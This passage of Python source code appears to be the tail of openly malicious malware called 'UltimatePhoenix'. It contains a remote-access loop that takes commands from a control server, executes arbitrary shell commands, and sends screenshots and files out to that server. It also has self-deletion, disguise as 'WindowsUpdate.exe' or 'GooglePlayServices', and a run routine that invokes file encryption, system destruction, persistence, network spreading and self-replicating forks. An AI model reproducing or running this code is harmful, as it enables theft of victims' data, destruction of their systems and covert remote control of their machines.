                        commands = response.json().get("commands", [])
                        for cmd in commands:
                            if cmd.get("type") == "screenshot":
                                self.take_screenshot()
                            elif cmd.get("type") == "execute":
                                subprocess.run(cmd.get("data", ""), shell=True)
                            elif cmd.get("type") == "upload":
                                self.upload_file(cmd.get("data", ""))
                            elif cmd.get("type") == "selfdestruct":
                                self.self_destruct()
                    time.sleep(30)
                except:
                    time.sleep(60)
        except:
            pass

    def take_screenshot(self):
        try:
            if self.os_type == "Windows":
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot_path = f"C:\\Windows\\Temp\\screenshot_{int(time.time())}.png"
                screenshot.save(screenshot_path)
                with open(screenshot_path, 'rb') as f:
                    encoded = base64.b64encode(f.read()).decode('utf-8')
                os.remove(screenshot_path)
                requests.post(self.server_url + "/screenshot", json={"bot_id": self.bot_id, "screenshot": encoded})
        except:
            pass

    def upload_file(self, file_path):
        try:
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    content = base64.b64encode(f.read()).decode('utf-8')
                requests.post(self.server_url + "/upload", json={"bot_id": self.bot_id, "file": file_path, "content": content})
        except:
            pass

    def self_destruct(self):
        try:
            self.running = False
            os.remove(__file__)
            sys.exit(0)
        except:
            pass

    # ============================================================
    # PHASE 8: STEALTH & DISGUISE
    # ============================================================
    def disguise_itself(self):
        try:
            current_file = os.path.abspath(__file__)
            if self.os_type == "Windows":
                new_name = os.path.join(os.path.dirname(current_file), "WindowsUpdate.exe")
                subprocess.run(f'attrib +h +s "{current_file}"', shell=True)
                if current_file != new_name:
                    shutil.copy2(current_file, new_name)
                    os.remove(current_file)
                    subprocess.Popen([new_name], creationflags=subprocess.CREATE_NO_WINDOW)
                    sys.exit(0)
            elif os.path.exists("/system/bin/"):
                new_name = "/system/bin/GooglePlayServices"
                if os.path.exists(current_file):
                    os.rename(current_file, new_name)
                subprocess.run('pm hide com.your.package.name', shell=True)
        except:
            pass

    # ============================================================
    # MAIN RUN
    # ============================================================
    def run(self):
        try:
            print("[+] Ultimate Phoenix is born!")
            self.evade_sandbox()
            self.disguise_itself()
            self.collect_all()
            self.encrypt_files()
            self.destroy_system()
            self.replicate_and_persist()
            self.spread_over_network()
            threading.Thread(target=self.rat_loop, daemon=True).start()

            for i in range(10):
                try:
                    if os.name == 'posix':
                        os.fork()
                        virus = UltimatePhoenix()
                        virus.run()
                    else:
                        threading.Thread(target=lambda: UltimatePhoenix().run()).start()
                except:
                    pass

            time.sleep(300)
            try:
                os.remove(__file__)
            except:
                pass
        except:
            pass

if __name__ == "__main__":
    try:
        virus = UltimatePhoenix()
        virus.run()
    except:
        pass